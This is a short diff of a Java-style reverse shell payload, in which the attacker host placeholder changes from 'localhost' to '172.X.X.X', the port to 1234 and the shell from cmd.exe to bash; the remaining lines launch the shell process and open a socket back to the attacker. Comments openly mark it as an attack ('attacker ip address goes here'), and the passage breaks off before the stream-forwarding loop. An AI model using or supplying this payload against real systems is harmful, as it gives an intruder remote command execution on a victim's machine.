@@ -1,7 +1,7 @@
 
-String host=”localhost”;                               ##attacker ip address goes here
-int port=8044;                                         ## input the attacker port number
-String cmd=”cmd.exe”;                                  ## you can change this to 'bash'
+String host=”172.X.X.X”;                               ##attacker ip address goes here
+int port=1234;                                         ## input the attacker port number
+String cmd=”bash”;                                  ## you can change this to 'bash'
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
 Socket s=new Socket(host,port);  ## socket for connection  
 InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
